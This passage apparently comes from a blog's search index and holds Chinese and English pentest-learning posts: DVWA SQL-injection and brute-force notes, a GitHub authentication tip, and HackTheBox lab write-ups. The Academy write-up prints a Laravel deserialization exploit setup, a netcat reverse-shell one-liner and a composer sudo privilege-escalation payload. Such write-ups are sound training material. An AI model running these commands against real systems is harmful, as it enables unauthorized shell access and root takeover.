class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Joined the token authentication mechanism. Check if the user’s input is a number.Using PDO technology to separated input and data.</p>
+<hr>
+<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><h3 id="Difficulty-Low-1"><a href="#Difficulty-Low-1" class="headerlink" title="Difficulty: Low"></a>Difficulty: Low</h3><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3qukc0wj30so0qgjug.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3qukc0wj30so0qgjug.jpg" alt="image-20210414111616071"></a></p>
+<p>Just cracking credentials in burp suite. Nothing more to say.</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj401jxndj316w0ecdil.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj401jxndj316w0ecdil.jpg" alt="image-20210414112506178"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3zn018kj30js0i4tb1.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj3zn018kj30js0i4tb1.jpg" alt="image-20210414112443376"></a></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get username</span></span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;username&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get password</span></span><br><span class="line">    <span class="variable">$pass</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass</span> = md5( <span class="variable">$pass</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check the database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="variable">$result</span> ) == <span class="number">1</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get users details</span></span><br><span class="line">        <span class="variable">$row</span>    = mysqli_fetch_assoc( <span class="variable">$result</span> );</span><br><span class="line">        <span class="variable">$avatar</span> = <span class="variable">$row</span>[<span class="string">&quot;avatar&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Login successful</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Welcome to the password protected area <span class="subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;<span class="subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Login failed</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Difficulty-Medium-2"><a href="#Difficulty-Medium-2" class="headerlink" title="Difficulty: Medium"></a>Difficulty: Medium</h3><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gpj44dhpicj314u0faq5v.jpg"><img src="https://tva1.sinaimg.cn/large/008eGmZEly1gpj44dhpicj314u0faq5v.jpg" alt="image-20210414112916367"></a></p>
+<p>The speed of cracking is very low, maybe we should check the source code.</p>
+<p>To be continue…</p>
+]]></content>
+      <tags>
+        <tag>Pentest-Learning</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Github Removed Password Authentication</title>
+    <url>/2021/11/04/Github-Removed-Password-Authentication/</url>
+    <content><![CDATA[<p>Today when I wanna deploy some new files on my git, I found this error:</p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNgy1gtl1mnynrqj61dm0fotcd02.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtl1mnynrqj61dm0fotcd02.jpg" alt="image-20210818165525245"></a></p>
+<p>It says Git just no longer support password authentication anymore, so we need to transfer anthentication type to Token Auth or SSH Auth.</p>
+<span id="more"></span>
+
+<h4 id="Token-Auth"><a href="#Token-Auth" class="headerlink" title="Token Auth"></a>Token Auth</h4><p>Go to Git-Settings-Developer settings-Personal access tokens-Generate new token</p>
+<p>![image-20210818170141703](/Users/fre4k5en/Library/Application Support/typora-user-images/image-20210818170141703.png)</p>
+<p>then we fill in form about the token and copy&amp;paste to config file</p>
+<h4 id="SSH-Auth"><a href="#SSH-Auth" class="headerlink" title="SSH Auth"></a>SSH Auth</h4><p>Generate a ssh-keygen</p>
+<figure class="highlight excel"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">ssh-keygen -<span class="built_in">t</span> rsa -C <span class="string">&quot;email@github.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>add the public key to github-Settings-SSH keys</p>
+<p><a href="https://tva1.sinaimg.cn/large/008i3skNgy1gtl39zo9xrj617m0g8wgb02.jpg"><img src="https://tva1.sinaimg.cn/large/008i3skNgy1gtl39zo9xrj617m0g8wgb02.jpg" alt="image-20210818175227424"></a></p>
+]]></content>
+      <tags>
+        <tag>Others</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Academy</title>
+    <url>/2021/11/04/HackTheBox-Academy/</url>
+    <content><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>利用nmap进行端口服务扫描</p>
+<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sV -sC <span class="number">10.10.10.215</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb2137z51j30zq0iydov.jpg" alt="image-20201203225102507"></a></p>
+<span id="more"></span>
+
+<h3 id="web权限"><a href="#web权限" class="headerlink" title="web权限"></a>web权限</h3><p>发现22、80端口，在本地hosts文件中加入解析记录</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#academy.htb</span><br><span class="line"></span><br><span class="line"><span class="number">10.10.10.215</span>	academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>访问80端口后发现，有登录和注册功能，admin.php可能是管理员登录入口，普通注册登录后发现没什么有价值的地方，但在抓取注册包时发现：</p>
+<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">uid=root<span class="variable">&amp;password</span>=root<span class="variable">&amp;confirm</span>=root<span class="variable">&amp;roleid</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>roleid=0，盲猜id可能是角色分组字段，尝试id=1注册的话可能是管理员，成功注册登录后，进入一个待办列表，</p>
+<p>第一项为：完整的初始化模块设置，账户密码最后一项状态为：pending待解决</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20x64wfj311n0u07ez.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20x64wfj311n0u07ez.jpg" alt="image-20201203225054548"></a></p>
+<p>发现地址 dev-staging-01.academy.htb，访问后提示没有对应的dns解析，通过登录页面尝试登录无果，在本地hosts文件中加入解析记录</p>
+<figure class="highlight accesslog"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#academy.htb</span><br><span class="line"></span><br><span class="line"><span class="number">10.10.10.215</span>	academy.htb</span><br><span class="line"></span><br><span class="line"><span class="number">10.10.10.215</span>	dev-staging-<span class="number">01</span>.academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>得到页面</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20tn6muj31450u01dy.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20tn6muj31450u01dy.jpg" alt="image-20201203225047966"></a></p>
+<p>提示文件访问权限错误，并在下方的请求数据中发现数据库账户密码、reddis信息、邮件服务器、文档目录等等</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20prlkrj30wj0u07gp.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20prlkrj30wj0u07gp.jpg" alt="image-20201203225042471"></a></p>
+<p>3306/6379/2525端口均关闭，这里有两个很重要的信息APP_NAME和APP_KEY</p>
+<p>msf中可以找到一个laravel框架反序列化漏洞利用脚本，填写option字段：</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">APP_KEY</span> dBLUaMuZz<span class="number">7</span>Iq<span class="number">06</span>XtL/Xnz/<span class="number">90</span>Ejq+DEEynggqubHWFj<span class="number">0</span>=</span><br><span class="line"></span><br><span class="line"><span class="attribute">RHOSTS</span> <span class="number">10.10.10.215</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">RPORT</span> <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">TARGETURI</span> /</span><br><span class="line"></span><br><span class="line"><span class="attribute">VHOST</span> dev-staging-<span class="number">01</span>.academy.htb</span><br></pre></td></tr></table></figure>
+
+<p>这里有个坑，虽然VHOST不是必须字段，但是这里必须要填，笔者猜测可能是因为本靶机存在VPN虚拟网络环境中的缘故。</p>
+<p>run后，获得www-data权限，查看/home，发现有很多用户，但只有cry0l1t3和mrb3n是我们熟悉的，mrb3n中没有有用的信息</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20klwfaj31620qs4dy.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20klwfaj31620qs4dy.jpg" alt="image-20201203225033972"></a></p>
+<p>在当前shell下不能cd更改工作目录，重新弹回来一个shell</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">rm <span class="regexp">/tmp/</span>f;mkfifo <span class="regexp">/tmp/</span>f;cat <span class="regexp">/tmp/</span>f|<span class="regexp">/bin/</span>sh -i <span class="number">2</span>&gt;&amp;<span class="number">1</span>|nc <span class="number">10.0</span>.<span class="number">0.1</span> <span class="number">4444</span> &gt;<span class="regexp">/tmp/</span>f</span><br></pre></td></tr></table></figure>
+
+<p><del>运行linpeas.sh后发现是一个开源基线检查脚本，应该是其他人传上去的，列出了很多可能存在漏洞可以提权的点（如果可能）中查看</del>没用</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20e93vcj31c00u0b1w.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwgy1glb20e93vcj31c00u0b1w.jpg" alt="image-20201203225023628"></a></p>
+<h3 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h3><p>[<img src="https://fre4k5en.me/Users/fre4k5en/Library/Application%20Support/typora-user-images/image-20201228122553130.png" alt="image-20201228122553130">](<a href="https://fre4k5en.me/Users/fre4k5en/Library/Application">https://fre4k5en.me/Users/fre4k5en/Library/Application</a> Support/typora-user-images/image-20201228122553130.png)</p>
+<p>各种翻看文件，发现了mysql root账户密码</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3knlyb7yj30u00xz79m.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3knlyb7yj30u00xz79m.jpg" alt="image-20201228145117912"></a></p>
+<p>这里有dbuser账户密码</p>
+<p>这里其实使用root登录数据库查找users表时，可以找到md5加密的mySup3rP4s5w0rd，一样的</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3ku0n30vj312s0a4whc.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3ku0n30vj312s0a4whc.jpg" alt="image-20201228145727443"></a></p>
+<p>爆破得到cry0l1t3账户，flag user.txt</p>
+<h3 id="Root-flag"><a href="#Root-flag" class="headerlink" title="Root flag"></a>Root flag</h3><p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3kxp4xwvj30v20ai75p.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3kxp4xwvj30v20ai75p.jpg" alt="image-20201228150100131"></a></p>
+<p>发现当前用户所处的有个adm组</p>
+<blockquote>
+<p>常见的伪用户如下所示：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">伪 用 户 含 义 </span><br><span class="line">bin 拥有可执行的用户命令文件 </span><br><span class="line">sys 拥有系统文件 </span><br><span class="line">adm 拥有帐户文件 </span><br><span class="line">uucp UUCP使用 </span><br><span class="line"><span class="built_in">lp</span> <span class="built_in">lp</span>或lpd子系统使用 </span><br><span class="line">nobody NFS使用</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>默认情况下Ubuntu（以10.04为例）创建的用户是自动添加到以下这些组的，<br>adm dialout cdrom plugdev lpadmin sambashare admin</p>
+<p>dialout（拨号）<br>cdrom（光驱）<br>plugdev（U盘等）<br>lpadmin（打印机）<br>sambashare（smb共享）<br>admin（sudo，这个就<a href="http://wiki.ubuntu.org.cn/Sudo">不解释</a>了）<br>adm（干嘛的？因为以前的/var/adm就是现在的/var/log，作用是作为非root用户时，该组用户可以查看log）</p>
+<p>在修改属组的时候，需要注意usermod命令参数易混淆。</p>
+<p>显示某用户所属的组</p>
+<blockquote>
+<p>id -nG 某用户</p>
+</blockquote>
+<p>如果某用户只属于组1，现在想让他属于组1组2组3，以下两种方法：</p>
+<ul>
+<li>方法一：添加用户到更多的组</li>
+</ul>
+<blockquote>
+<p>usermod -a -G 组2,组3 某用户</p>
+</blockquote>
+<ul>
+<li>方法二：重新分配用户到哪些组</li>
+</ul>
+<blockquote>
+<p>usermod -G 组1,组2,组3 某用户</p>
+</blockquote>
+</blockquote>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o36dmicj30uk0mm0xe.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o36dmicj30uk0mm0xe.jpg" alt="image-20201228165001227"></a></p>
+<p>没有找到有价值的信息</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o4kopezj30vc06cq3p.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o4kopezj30vc06cq3p.jpg" alt="image-20201228165123755"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o6zoxnvj30gs03ewen.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o6zoxnvj30gs03ewen.jpg" alt="image-20201228165343217"></a></p>
+<p>当前不在sudoers中不能使用sudo执行命令</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o5tx10mj30w40gqmzv.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3o5tx10mj30w40gqmzv.jpg" alt="image-20201228165235718"></a></p>
+<p><del>egre55账户中有一个.sudo_as_admin_successful的空文件，也许这个账户可以使用sudo执行命令？</del>（误导）</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oiz07oij30t406mmyk.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oiz07oij30t406mmyk.jpg" alt="image-20201228170514441"></a></p>
+<p>执行LinPEAS.sh时发现了su log中记录了mrb3n的密码</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3onjj4w2j31gi0e6di0.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3onjj4w2j31gi0e6di0.jpg" alt="image-20201228170937465"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3opy0xntj30u00v2n4d.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3opy0xntj30u00v2n4d.jpg" alt="image-20201228171155832"></a></p>
+<p>当前用户有权限执行composer命令，并且发现$home中有composer文件夹</p>
+<blockquote>
+<p>Composer 是 PHP5.3以上 的一个依赖<a href="https://baike.baidu.com/item/%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/9143974">管理工具</a>。它允许你声明项目所依赖的<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%A0%81%E5%BA%93/969653">代码库</a>，它会在你的项目中为你安装他们。Composer 不是一个包管理器。是的，它涉及 “packages” 和 “libraries”，但它在每个项目的基础上进行管理，在你项目的某个目录中（例如 vendor）进行安装。默认情况下它不会在全局安装任何东西。因此，这仅仅是一个依赖管理。</p>
+</blockquote>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oy21t15j30re060dgh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3oy21t15j30re060dgh.jpg" alt="image-20201228171943711"></a></p>
+<p>composer执行文件具有root权限</p>
+<p>Google : “composer privilege escalation”，很容易就能找到一些利用点</p>
+<blockquote>
+<h2 id="Sudo"><a href="#Sudo" class="headerlink" title="Sudo"></a>Sudo</h2><p>If the binary is allowed to run as superuser by <code>sudo</code>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.</p>
+<ul>
+<li><pre><code>TF=$(mktemp -d)
+echo &#39;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#39; &gt;$TF/composer.json
+sudo composer --working-dir=$TF run-script x
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pbtym3oj313q0csgoh.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pbtym3oj313q0csgoh.jpg" alt="image-20201228173258036"></a></p>
+<p>成功拿到root权限</p>
+<p><a href="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pfhp19hj314k0suacd.jpg"><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gm3pfhp19hj314k0suacd.jpg" alt="image-20201228173628888"></a></p>
+<p>最后推广了一波HTB的新平台<a href="https://academy.hackthebox.eu/">https://academy.hackthebox.eu</a></p>
+<h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><a href="https://www.runoob.com/linux/linux-user-manage.html">https://www.runoob.com/linux/linux-user-manage.html</a></p>
+<p><a href="https://skyyan.wordpress.com/2011/06/29/adm-vs-admin/">https://skyyan.wordpress.com/2011/06/29/adm-vs-admin/</a></p>
+<p><a href="https://baike.baidu.com/item/composer/3351208?fr=aladdin">https://baike.baidu.com/item/composer/3351208?fr=aladdin</a></p>
+<p><a href="https://gtfobins.github.io/gtfobins/composer/">https://gtfobins.github.io/gtfobins/composer/</a></p>
+]]></content>
+      <tags>
+        <tag>Writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Beginner Track</title>
+    <url>/2021/11/04/HackTheBox-Beginner-Track/</url>
+    <content><![CDATA[<h1 id="BEGINNER-TRACK"><a href="#BEGINNER-TRACK" class="headerlink" title="BEGINNER TRACK"></a>BEGINNER TRACK</h1><p>共10题</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13z7cln8j30u00vhn67.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsk9od6j20u00vh767.jpg" alt="image-20210226182347964"></a></p>
+<span id="more"></span>
+
+<h2 id="1-10-Lame"><a href="#1-10-Lame" class="headerlink" title="1/10 Lame"></a>1/10 Lame</h2><h3 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h3><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gnzuo0kl0uj31c00u0hdt.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsguk4yj21c00u0qfi.jpg" alt="image-20210225161603078"></a></p>
+<p>发现开放了139、445，因为是Linux主机，证明存在Samba组件</p>
+<p>并且445端口发现版本号为3.0.20</p>
+<p>searchsploit查找对应漏洞，找到一个“用户名地图命令执行（metasploitable）”</p>
+<h3 id="Enumrating"><a href="#Enumrating" class="headerlink" title="Enumrating"></a>Enumrating</h3><p>启动metasploit搜索 Samba ‘User map script’ Command Execution</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gnzv28qbczj30wt0u0ak0.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsktilqj20wt0u0aem.jpg" alt="image-20210225162946129"></a></p>
+<p>得到root，用python生成交互shell，得到flag</p>
+<hr>
+<h2 id="2-10-Find-The-Pass"><a href="#2-10-Find-The-Pass" class="headerlink" title="2/10 Find The Pass"></a>2/10 Find The Pass</h2><p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gnzve1t7tkj317g0gg76w.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsngqyzj217g0gggnd.jpg" alt="image-20210225164106838"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1gnzveqgik8j30kq07i0tt.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsj8djhj20kq07ijrq.jpg" alt="image-20210225164146940"></a></p>
+<h3 id="zip密码"><a href="#zip密码" class="headerlink" title="zip密码"></a>zip密码</h3><p>得到一个zip文件，解压需要密码</p>
+<p>用winhex打开zip文件，发现：不论是源文件数据区还是源文件目录区，密码标志位都是09 00，那证明这个压缩密码是确实存在的，并不是伪加密技术</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go10j7bvchj31060kktgl.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsmlu42j21060kkdmf.jpg" alt="image-20210226162434293"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go10jvn7dnj30uk0u0wnu.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsjrxrwj20uk0u0wku.jpg" alt="image-20210226162516472"></a></p>
+<p>暴力破解了一天无果，索性尝试了一个hackthebox，竟然对了。。。看来这题不是考zip加密。。。</p>
+<h3 id="逆向破解"><a href="#逆向破解" class="headerlink" title="逆向破解"></a>逆向破解</h3><p>解压后得到EasyPass.exe</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13a6c28vj30kc0d075a.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsm46eej20kc0d0t95.jpg" alt="image-20210226175945484"></a></p>
+<p>输入错误的密码后会弹窗</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13byysy3j30ju0ce75f.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsl3qtnj20ju0cemxl.jpg" alt="image-20210226180128394"></a></p>
+<p>使用Immunity Debugger打开，查看明文字符串</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13d1aw23j30ty0sgwm2.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsmzgbhj20ty0sgdjo.jpg" alt="image-20210226180229923"></a></p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13m3pm3rj31120gswir.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dshuijuj21120gs0wi.jpg" alt="image-20210226181112983"></a></p>
+<p>双击查看”Wrong Password!”，跳转到前一步，F9运行程序，在00454131处下断点</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13qnbzmxj316a0u01kx.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsiecetj216a0u0wpq.jpg" alt="image-20210226181534958"></a></p>
+<p>而后输入任意密码点击Check Password</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13rx598lj31690u01kx.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dslo5gbj21690u0qdz.jpg" alt="image-20210226181648222"></a></p>
+<p>得到明文密码 “fortran!”，测试该密码</p>
+<p><a href="https://tva1.sinaimg.cn/large/008eGmZEly1go13stad69j30k00ckmye.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5dsivo8bj20k00ck0t8.jpg" alt="image-20210226181739617"></a></p>
+<hr>
+<h2 id="3-10-Weak-RSA"><a href="#3-10-Weak-RSA" class="headerlink" title="3/10 Weak RSA"></a>3/10 Weak RSA</h2><p>打开zip，密码hackthebox</p>
+<p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5e1kwap6j20880323yi.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5e1kwap6j20880323yi.jpg" alt="image-20210302111420376"></a></p>
+<p>一个公钥，一个enc文件，根据题目，尝试通过公钥破解加密文件flag.enc</p>
+<p>克隆项目<a href="https://github.com/Ganapati/RsaCtfTool">https://github.com/Ganapati/RsaCtfTool</a></p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">./RsaCtfTool.py</span> <span class="params">--publickey</span> <span class="string">./key.pub</span> <span class="params">--uncipherfile</span> <span class="string">./ciphered</span>\_file</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5muj4jm1j21ba0u0dp7.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5muj4jm1j21ba0u0dp7.jpg" alt="image-20210302161857001"></a></p>
+<hr>
+<h2 id="4-10-Jerry"><a href="#4-10-Jerry" class="headerlink" title="4/10 Jerry"></a>4/10 Jerry</h2><p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p5kmftsj216o0d676y.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p5kmftsj216o0d676y.jpg" alt="image-20210302173843752"></a></p>
+<p>8080端口存在tomcat 7.0.88，访问之后是欢迎页面</p>
+<p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p6afd7sj216u0u0toz.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p6afd7sj216u0u0toz.jpg" alt="image-20210302173927165"></a></p>
+<p>尝试登录host manager，发现403</p>
+<p>使用msf的scanner/http/tomcat_mgr_login模块进行爆破</p>
+<p><a href="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p7oj8waj20v807edi1.jpg"><img src="https://tva1.sinaimg.cn/large/e6c9d24ely1go5p7oj8waj20v807edi1.jpg" alt="image-20210302174047414"></a></p>
+<p>发现默认的账户密码tomcat:s3cret，其实这里可以从403报错中看到默认账户密码</p>
